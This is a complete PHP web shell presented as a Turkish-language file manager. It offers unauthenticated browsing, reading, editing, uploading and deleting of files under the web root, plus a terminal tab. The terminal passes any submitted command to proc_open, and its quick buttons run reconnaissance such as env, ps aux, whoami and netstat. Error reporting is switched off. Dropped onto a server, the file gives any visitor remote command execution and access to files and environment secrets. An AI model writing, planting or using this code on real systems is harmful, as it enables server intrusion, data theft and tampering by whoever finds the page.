<?php
error_reporting(0);

$ROOT = realpath(dirname(__FILE__));

// ---- YARDIMCI ----
function safe($path) {
    global $ROOT;
    $real = realpath($path);
    if ($real === false) {
        $real = realpath(dirname($path));
        if ($real === false) return false;
        $real = $real . DIRECTORY_SEPARATOR . basename($path);
    }
    if (strpos($real, $ROOT) !== 0) return false;
    return $real;
}

function rel($abs) {
    global $ROOT;
    return ltrim(str_replace($ROOT, '', $abs), '/\\');
}

function fsize($b) {
    if ($b < 1024) return $b . ' B';
    if ($b < 1048576) return round($b/1024, 1) . ' KB';
    if ($b < 1073741824) return round($b/1048576, 1) . ' MB';
    return round($b/1073741824, 1) . ' GB';
}

// ---- EYLEMLER ----
$act = isset($_REQUEST['act']) ? $_REQUEST['act'] : '';

if ($act == 'list') {
    $p   = isset($_GET['p']) ? $_GET['p'] : '';
    $dir = safe($ROOT . '/' . $p);
    if (!$dir || !is_dir($dir)) { echo 'ERR:Gecersiz dizin'; exit; }
    $out = array();
    $entries = scandir($dir);
    foreach ($entries as $e) {
        if ($e == '.') continue;
        if ($e == '..' && $dir == $ROOT) continue;
        $full = $dir . DIRECTORY_SEPARATOR . $e;
        $out[] = (is_dir($full) ? 'D' : 'F') . '|' . $e . '|' . rel($full) . '|' . (is_file($full) ? fsize(filesize($full)) : '') . '|' . date('d.m.Y H:i', filemtime($full));
    }
    echo implode("\n", $out);
    exit;
}

if ($act == 'read') {
    $file = safe($ROOT . '/' . (isset($_GET['p']) ? $_GET['p'] : ''));
    if (!$file || !is_file($file)) { echo 'ERR:Dosya bulunamadi'; exit; }
    echo file_get_contents($file);
    exit;
}

if ($act == 'save') {
    $file    = safe($ROOT . '/' . (isset($_POST['p']) ? $_POST['p'] : ''));
    $content = isset($_POST['content']) ? $_POST['content'] : '';
    if (!$file) { echo 'ERR:Gecersiz yol'; exit; }
    file_put_contents($file, $content);
    echo 'OK';
    exit;
}

if ($act == 'delete') {
    $target = safe($ROOT . '/' . (isset($_POST['p']) ? $_POST['p'] : ''));
    if (!$target || $target == $ROOT) { echo 'ERR:Gecersiz'; exit; }
    if (is_dir($target)) {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($it as $f) {
            if ($f->isDir()) rmdir($f->getRealPath());
            else unlink($f->getRealPath());
        }
        rmdir($target);
    } else {
        unlink($target);
    }
    echo 'OK';
    exit;
}

if ($act == 'rename') {
    $old     = safe($ROOT . '/' . (isset($_POST['p']) ? $_POST['p'] : ''));
    $newname = basename(isset($_POST['newname']) ? $_POST['newname'] : '');
    if (!$old || !$newname) { echo 'ERR:Gecersiz'; exit; }
    $new = safe(dirname($old) . '/' . $newname);
    if (!$new) { echo 'ERR:Gecersiz isim'; exit; }
    if (file_exists($new)) { echo 'ERR:Bu isim zaten var'; exit; }
    rename($old, $new);
    echo 'OK';
    exit;
}

if ($act == 'mkdir') {
    $parent = safe($ROOT . '/' . (isset($_POST['p']) ? $_POST['p'] : ''));
    $name   = basename(isset($_POST['name']) ? $_POST['name'] : '');
    if (!$parent || !$name) { echo 'ERR:Gecersiz'; exit; }
    $new = $parent . DIRECTORY_SEPARATOR . $name;
    if (file_exists($new)) { echo 'ERR:Zaten var'; exit; }
    mkdir($new, 0755);
    echo 'OK';
    exit;
}

if ($act == 'mkfile') {
    $parent = safe($ROOT . '/' . (isset($_POST['p']) ? $_POST['p'] : ''));
    $name   = basename(isset($_POST['name']) ? $_POST['name'] : '');
    if (!$parent || !$name) { echo 'ERR:Gecersiz'; exit; }
    $new = $parent . DIRECTORY_SEPARATOR . $name;
    if (file_exists($new)) { echo 'ERR:Zaten var'; exit; }
    file_put_contents($new, '');
    echo 'OK';
    exit;
}

if ($act == 'upload') {
    $dir = safe($ROOT . '/' . (isset($_POST['p']) ? $_POST['p'] : ''));
    if (!$dir || !is_dir($dir)) { echo 'ERR:Gecersiz dizin'; exit; }
    $ok = 0;
    foreach ($_FILES as $file) {
        if (is_array($file['name'])) {
            foreach ($file['name'] as $i => $fname) {
                if ($file['error'][$i] == 0) {
                    move_uploaded_file($file['tmp_name'][$i], $dir . DIRECTORY_SEPARATOR . basename($fname));
                    $ok++;
                }
            }
        } else {
            if ($file['error'] == 0) {
                move_uploaded_file($file['tmp_name'], $dir . DIRECTORY_SEPARATOR . basename($file['name']));
                $ok++;
            }
        }
    }
    echo 'OK:' . $ok;
    exit;
}

if ($act == 'shell') {
    $cmd = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';
    $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : $ROOT;
    $cwd = realpath($cwd);
    if (!$cwd || strpos($cwd, $ROOT) !== 0) $cwd = $ROOT;

    if (empty($cmd)) { echo 'CWD:' . $cwd; exit; }

    // cd komutu
    if (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target == '~' || $target == '') $new = $ROOT;
        else $new = realpath($cwd . '/' . $target);
        if ($new && strpos($new, $ROOT) === 0) {
            echo 'CWD:' . $new;
        } else {
            echo "bash: cd: Erisim reddedildi\nCWD:" . $cwd;
        }
        exit;
    }

    $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
    $proc = proc_open($cmd, $desc, $pipes, $cwd);
    if (!is_resource($proc)) { echo "Komut calistirulamadi\nCWD:" . $cwd; exit; }
    fclose($pipes[0]);
    $out  = stream_get_contents($pipes[1]);
    $err  = stream_get_contents($pipes[2]);
    fclose($pipes[1]); fclose($pipes[2]);
    proc_close($proc);
    echo $out . $err . "\nCWD:" . $cwd;
    exit;
}
?><!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Dosya Yoneticisi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0e1117;color:#cdd6f4;font-family:monospace;font-size:13px;height:100vh;display:flex;flex-direction:column}
#tabs{display:flex;background:#1e2130;border-bottom:1px solid #2a2e42}
.tab{padding:10px 22px;cursor:pointer;color:#6c7086;border-bottom:2px solid transparent}
.tab.on{color:#89b4fa;border-bottom-color:#89b4fa}
#pane-files,#pane-shell{display:none;flex:1;flex-direction:column;overflow:hidden}
#pane-files.on,#pane-shell.on{display:flex}
/* toolbar */
#toolbar{background:#1e2130;padding:6px 10px;display:flex;gap:6px;flex-wrap:wrap;border-bottom:1px solid #2a2e42;align-items:center}
#bread{background:#181b27;padding:5px 10px;font-size:12px;color:#6c7086;border-bottom:1px solid #2a2e42;flex-shrink:0}
#bread a{color:#89b4fa;cursor:pointer;text-decoration:none}
button,input[type=text]{font-family:monospace;font-size:12px}
button{background:#2a2e42;border:1px solid #3a3f55;color:#cdd6f4;padding:4px 11px;cursor:pointer;border-radius:4px}
button:hover{background:#3a3f55}
button.red:hover{background:#3d1a1f;border-color:#e74c5e;color:#e74c5e}
button.green{background:#1a2e2a;border-color:#3dcf8e;color:#3dcf8e}
input[type=text]{background:#1e2130;border:1px solid #2a2e42;color:#cdd6f4;padding:4px 8px;border-radius:4px;outline:none}
input[type=text]:focus{border-color:#89b4fa}
#srch{width:160px}
/* file table */
#ftable-wrap{flex:1;overflow:auto}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:5px 8px;font-size:11px;color:#6c7086;border-bottom:1px solid #2a2e42;position:sticky;top:0;background:#0e1117}
td{padding:6px 8px;border-bottom:1px solid #181b27;vertical-align:middle}
tr:hover td{background:#181b27}
td.nm{cursor:pointer;color:#89b4fa}
td.nm:hover{text-decoration:underline}
td.sz,td.dt{color:#6c7086;font-size:11px;white-space:nowrap}
td.ac{text-align:right;white-space:nowrap}
td.ac button{padding:2px 7px;font-size:11px;margin-left:2px}
/* editor overlay */
#editor{display:none;position:fixed;inset:0;background:#0e1117;z-index:50;flex-direction:column}
#editor.on{display:flex}
#editor-head{background:#1e2130;border-bottom:1px solid #2a2e42;padding:6px 10px;display:flex;gap:6px;align-items:center}
#editor-title{flex:1;color:#6c7086;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
#editor-area{flex:1;background:#090b10;border:none;color:#cdd6f4;font-family:monospace;font-size:13px;padding:12px;resize:none;outline:none;line-height:1.7}
/* shell */
#term-out{flex:1;overflow-y:auto;padding:10px;font-family:monospace;font-size:13px;line-height:1.7;white-space:pre-wrap;word-break:break-all;color:#a6adc8}
#term-out::-webkit-scrollbar{width:4px}
#term-out::-webkit-scrollbar-thumb{background:#2a2e42}
.t-ps{color:#a6e3a1}.t-er{color:#f38ba8}.t-pt{color:#89b4fa}
#term-in-row{display:flex;align-items:center;gap:6px;padding:6px 10px;background:#1e2130;border-top:1px solid #2a2e42;flex-shrink:0}
#term-prompt{color:#a6e3a1;white-space:nowrap;font-size:13px}
#term-in{flex:1;background:transparent;border:none;color:#cdd6f4;font-family:monospace;font-size:13px;outline:none}
/* quick cmds */
#qcmds{background:#181b27;border-bottom:1px solid #2a2e42;padding:4px 10px;display:flex;gap:5px;flex-wrap:wrap;flex-shrink:0}
.qc{background:#2a2e42;border:1px solid #3a3f55;border-radius:3px;padding:1px 8px;font-size:11px;cursor:pointer;color:#a6adc8;font-family:monospace}
.qc:hover{color:#89b4fa;border-color:#89b4fa}
/* modal */
#modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:100;align-items:center;justify-content:center}
#modal.on{display:flex}
#modal-box{background:#1e2130;border:1px solid #2a2e42;border-radius:8px;padding:20px;min-width:300px}
#modal-box h3{margin-bottom:12px;font-size:14px}
#modal-inp{width:100%;margin-bottom:14px}
#modal-btns{display:flex;gap:8px;justify-content:flex-end}
/* upload */
#upl-form{display:none}
.msg{padding:30px;text-align:center;color:#6c7086}
</style>
</head>
<body>

<div id="tabs">
  <div class="tab on" onclick="showTab('files')">📁 Dosyalar</div>
  <div class="tab" onclick="showTab('shell')">💻 Terminal</div>
  <div style="flex:1"></div>
  <div style="padding:10px;color:#6c7086;font-size:11px">PHP <?php echo PHP_VERSION; ?> &nbsp;|&nbsp; <?php echo php_uname('n'); ?></div>
</div>

<!-- FILES PANE -->
<div id="pane-files" class="on">
  <div id="toolbar">
    <button onclick="mkdirUI()">+ Klasor</button>
    <button onclick="mkfileUI()">+ Dosya</button>
    <button onclick="uploadUI()" class="green">⬆ Yukle</button>
    <button onclick="loadDir(curPath)">↺ Yenile</button>
    <input type="text" id="srch" placeholder="Filtrele..." oninput="filter(this.value)">
    <form id="upl-form" enctype="multipart/form-data">
      <input type="file" id="upl-input" name="files[]" multiple onchange="doUpload()">
    </form>
  </div>
  <div id="bread"></div>
  <div id="ftable-wrap">
    <div class="msg">Yukleniyor...</div>
  </div>
</div>

<!-- SHELL PANE -->
<div id="pane-shell">
  <div id="qcmds">
    <span style="color:#6c7086;font-size:11px;align-self:center">Hizli:</span>
    <span class="qc" onclick="qcmd('ls -la')">ls -la</span>
    <span class="qc" onclick="qcmd('pwd')">pwd</span>
    <span class="qc" onclick="qcmd('df -h')">df -h</span>
    <span class="qc" onclick="qcmd('free -h')">free -h</span>
    <span class="qc" onclick="qcmd('ps aux')">ps aux</span>
    <span class="qc" onclick="qcmd('php -v')">php -v</span>
    <span class="qc" onclick="qcmd('uname -a')">uname</span>
    <span class="qc" onclick="qcmd('whoami')">whoami</span>
    <span class="qc" onclick="qcmd('env')">env</span>
    <span class="qc" onclick="qcmd('netstat -tlnp 2>/dev/null || ss -tlnp')">ports</span>
    <span class="qc" onclick="clearTerm()">🗑 Temizle</span>
  </div>
  <div id="term-out"></div>
  <div id="term-in-row">
    <span id="term-prompt">$ </span>
    <input type="text" id="term-in" placeholder="komut..." autocomplete="off" spellcheck="false">
    <button onclick="runCmd()">▶</button>
  </div>
</div>

<!-- EDITOR -->
<div id="editor">
  <div id="editor-head">
    <span id="editor-title"></span>
    <button onclick="saveFile()" class="green">💾 Kaydet</button>
    <button onclick="closeEditor()">✕ Kapat</button>
  </div>
  <textarea id="editor-area" spellcheck="false"></textarea>
</div>

<!-- MODAL -->
<div id="modal" onclick="closeModal()">
  <div id="modal-box" onclick="event.stopPropagation()">
    <h3 id="modal-title"></h3>
    <input type="text" id="modal-inp" class="input" onkeydown="if(event.keyCode==13)modalOK()">
    <div id="modal-btns">
      <button onclick="closeModal()">Iptal</button>
      <button onclick="modalOK()" class="green" id="modal-ok-btn">Tamam</button>
    </div>
  </div>
</div>

<script>
var curPath  = '';
var editPath = '';
var shellCwd = <?php echo "'" . addslashes($ROOT) . "'"; ?>;
var cmdHist  = [];
var histIdx  = -1;
var modalCb  = null;

// ---- TABS ----
function showTab(t) {
  document.getElementById('pane-files').className = t == 'files' ? 'on' : '';
  document.getElementById('pane-shell').className = t == 'shell' ? 'on' : '';
  document.querySelectorAll('.tab')[0].className  = t == 'files' ? 'tab on' : 'tab';
  document.querySelectorAll('.tab')[1].className  = t == 'shell'  ? 'tab on' : 'tab';
  if (t == 'shell') document.getElementById('term-in').focus();
}

// ---- FILE MANAGER ----
function ajax(url, data, cb) {
  var xhr = new XMLHttpRequest();
  if (data) {
    xhr.open('POST', url, true);
    var fd = new FormData();
    for (var k in data) fd.append(k, data[k]);
    xhr.onload = function() { cb(xhr.responseText); };
    xhr.send(fd);
  } else {
    xhr.open('GET', url, true);
    xhr.onload = function() { cb(xhr.responseText); };
    xhr.send();
  }
}

function loadDir(p) {
  curPath = p;
  renderBread(p);
  document.getElementById('ftable-wrap').innerHTML = '<div class="msg">Yukleniyor...</div>';
  ajax('?act=list&p=' + encodeURIComponent(p), null, function(res) {
    renderFiles(res.trim());
    document.getElementById('srch').value = '';
  });
}

function renderBread(p) {
  var html = '<a onclick="loadDir(\'\')" >Kok</a>';
  if (p) {
    var parts = p.split('/');
    var acc   = '';
    for (var i = 0; i < parts.length; i++) {
      acc += (acc ? '/' : '') + parts[i];
      var c = acc;
      if (i < parts.length - 1) html += ' / <a onclick="loadDir(\'' + c + '\')">' + parts[i] + '</a>';
      else html += ' / ' + parts[i];
    }
  }
  document.getElementById('bread').innerHTML = html;
}

function renderFiles(raw) {
  if (!raw) {
    document.getElementById('ftable-wrap').innerHTML = '<div class="msg">Bu dizin bos.</div>';
    return;
  }
  var lines = raw.split('\n');
  var rows  = '';
  for (var i = 0; i < lines.length; i++) {
    var l = lines[i].trim();
    if (!l) continue;
    var parts = l.split('|');
    var type  = parts[0];
    var name  = parts[1];
    var path  = parts[2];
    var size  = parts[3];
    var date  = parts[4];
    var icon  = type == 'D' ? '📁' : '📄';
    var pe    = path.replace(/\\/g, '/').replace(/'/g, "\\'");
    var ne    = name.replace(/</g,'&lt;').replace(/>/g,'&gt;');

    var nmClick = type == 'D' ?
      'loadDir(\'' + pe + '\')' :
      'openFile(\'' + pe + '\')';

    rows += '<tr data-name="' + ne.toLowerCase() + '">' +
      '<td class="nm" onclick="' + nmClick + '">' + icon + ' ' + ne + '</td>' +
      '<td class="sz">' + size + '</td>' +
      '<td class="dt">' + date + '</td>' +
      '<td class="ac">' +
        (type == 'F' ? '<button onclick="openFile(\'' + pe + '\')">Duzenle</button>' : '') +
        '<button onclick="renameUI(\'' + pe + '\',\'' + ne + '\')">Yeniden Adlandir</button>' +
        '<button class="red" onclick="delUI(\'' + pe + '\',\'' + ne + '\',' + (type=='D'?'1':'0') + ')">Sil</button>' +
      '</td></tr>';
  }

  var html = '<table><thead><tr><th>Ad</th><th>Boyut</th><th>Tarih</th><th>Islem</th></tr></thead><tbody>' + rows + '</tbody></table>';
  document.getElementById('ftable-wrap').innerHTML = html;
}

function filter(q) {
  q = q.toLowerCase();
  var rows = document.querySelectorAll('#ftable-wrap tbody tr');
  for (var i = 0; i < rows.length; i++) {
    var n = rows[i].getAttribute('data-name') || '';
    rows[i].style.display = (!q || n.indexOf(q) >= 0) ? '' : 'none';
  }
}

function openFile(p) {
  ajax('?act=read&p=' + encodeURIComponent(p), null, function(res) {
    editPath = p;
    document.getElementById('editor-title').textContent = p;
    document.getElementById('editor-area').value = res;
    document.getElementById('editor').className = 'on';
    document.getElementById('editor-area').focus();
  });
}

function closeEditor() {
  document.getElementById('editor').className = '';
  editPath = '';
}

function saveFile() {
  var content = document.getElementById('editor-area').value;
  ajax('?act=save', {p: editPath, content: content}, function(res) {
    if (res == 'OK') alert('Kaydedildi!');
    else alert(res);
  });
}

function delUI(path, name, isDir) {
  var msg = '"' + name + '" ' + (isDir ? 'klasoru ve icerigini' : 'dosyasini') + ' silmek istediginize emin misiniz?';
  if (!confirm(msg)) return;
  ajax('?act=delete', {p: path}, function(res) {
    if (res == 'OK') loadDir(curPath);
    else alert(res);
  });
}

function renameUI(path, name) {
  showModal('Yeniden Adlandir', name, function(val) {
    ajax('?act=rename', {p: path, newname: val}, function(res) {
      if (res == 'OK') loadDir(curPath);
      else alert(res);
    });
  });
}

function mkdirUI() {
  showModal('Yeni Klasor Adi', '', function(val) {
    ajax('?act=mkdir', {p: curPath, name: val}, function(res) {
      if (res == 'OK') loadDir(curPath);
      else alert(res);
    });
  });
}

function mkfileUI() {
  showModal('Yeni Dosya Adi', '', function(val) {
    ajax('?act=mkfile', {p: curPath, name: val}, function(res) {
      if (res == 'OK') loadDir(curPath);
      else alert(res);
    });
  });
}

function uploadUI() {
  document.getElementById('upl-input').click();
}

function doUpload() {
  var input = document.getElementById('upl-input');
  if (!input.files.length) return;
  var fd = new FormData();
  fd.append('act', 'upload');
  fd.append('p', curPath);
  for (var i = 0; i < input.files.length; i++) {
    fd.append('files[]', input.files[i]);
  }
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '', true);
  xhr.onload = function() {
    alert(xhr.responseText.indexOf('OK') == 0 ? 'Yuklendi!' : xhr.responseText);
    loadDir(curPath);
    input.value = '';
  };
  xhr.send(fd);
}

// ---- MODAL ----
function showModal(title, val, cb) {
  document.getElementById('modal-title').textContent = title;
  document.getElementById('modal-inp').value = val;
  document.getElementById('modal').className = 'on';
  document.getElementById('modal-inp').focus();
  document.getElementById('modal-inp').select();
  modalCb = cb;
}

function closeModal() {
  document.getElementById('modal').className = '';
  modalCb = null;
}

function modalOK() {
  var val = document.getElementById('modal-inp').value.trim();
  if (!val) return;
  closeModal();
  if (modalCb) modalCb(val);
}

// ---- SHELL ----
function appendTerm(html) {
  var out = document.getElementById('term-out');
  var d = document.createElement('div');
  d.innerHTML = html;
  out.appendChild(d);
  out.scrollTop = out.scrollHeight;
}

function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function updatePrompt() {
  var root = <?php echo "'" . addslashes($ROOT) . "'"; ?>;
  var show = shellCwd.replace(root, '~') || '~';
  document.getElementById('term-prompt').innerHTML = '<span class="t-ps">$ </span><span class="t-pt">' + escHtml(show) + '</span> ';
}

function runCmd() {
  var inp = document.getElementById('term-in');
  var cmd = inp.value.trim();
  if (!cmd) return;
  cmdHist.unshift(cmd);
  histIdx = -1;
  inp.value = '';

  var root = <?php echo "'" . addslashes($ROOT) . "'"; ?>;
  var show = shellCwd.replace(root, '~') || '~';
  appendTerm('<span class="t-ps">$ </span><span class="t-pt">' + escHtml(show) + '</span> ' + escHtml(cmd));

  var fd = new FormData();
  fd.append('act', 'shell');
  fd.append('cmd', cmd);
  fd.append('cwd', shellCwd);
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '', true);
  xhr.onload = function() {
    var res  = xhr.responseText;
    var cwdM = res.lastIndexOf('\nCWD:');
    var newCwd = null;
    var out    = res;
    if (cwdM >= 0) {
      newCwd = res.substring(cwdM + 5).trim();
      out    = res.substring(0, cwdM);
    } else if (res.indexOf('CWD:') === 0) {
      newCwd = res.substring(4).trim();
      out    = '';
    }
    if (newCwd) { shellCwd = newCwd; updatePrompt(); }
    if (out.trim()) appendTerm('<span class="t-er">' + escHtml(out) + '</span>');
  };
  xhr.send(fd);
}

function qcmd(cmd) {
  showTab('shell');
  document.getElementById('term-in').value = cmd;
  runCmd();
}

function clearTerm() {
  document.getElementById('term-out').innerHTML = '';
}

// ---- KEYBOARD ----
document.addEventListener('keydown', function(e) {
  var inp = document.getElementById('term-in');
  if (document.getElementById('pane-shell').className == 'on' && document.activeElement == inp) {
    if (e.keyCode == 13) { runCmd(); }
    else if (e.keyCode == 38) { e.preventDefault(); if (histIdx < cmdHist.length-1) { histIdx++; inp.value = cmdHist[histIdx]; } }
    else if (e.keyCode == 40) { e.preventDefault(); if (histIdx > 0) { histIdx--; inp.value = cmdHist[histIdx]; } else { histIdx=-1; inp.value=''; } }
    else if (e.keyCode == 76 && e.ctrlKey) { e.preventDefault(); clearTerm(); }
  }
  if (e.keyCode == 27) {
    closeModal();
    closeEditor();
  }
  if (e.keyCode == 83 && (e.ctrlKey || e.metaKey) && editPath) {
    e.preventDefault();
    saveFile();
  }
});

// ---- INIT ----
loadDir('');
updatePrompt();
appendTerm('<span style="color:#6c7086">Terminal hazir. Root: ' + escHtml(<?php echo "'" . addslashes($ROOT) . "'"; ?>) + '  |  Ctrl+L temizle  |  yukari/asagi gecmis</span>');
</script>
</body>
</html>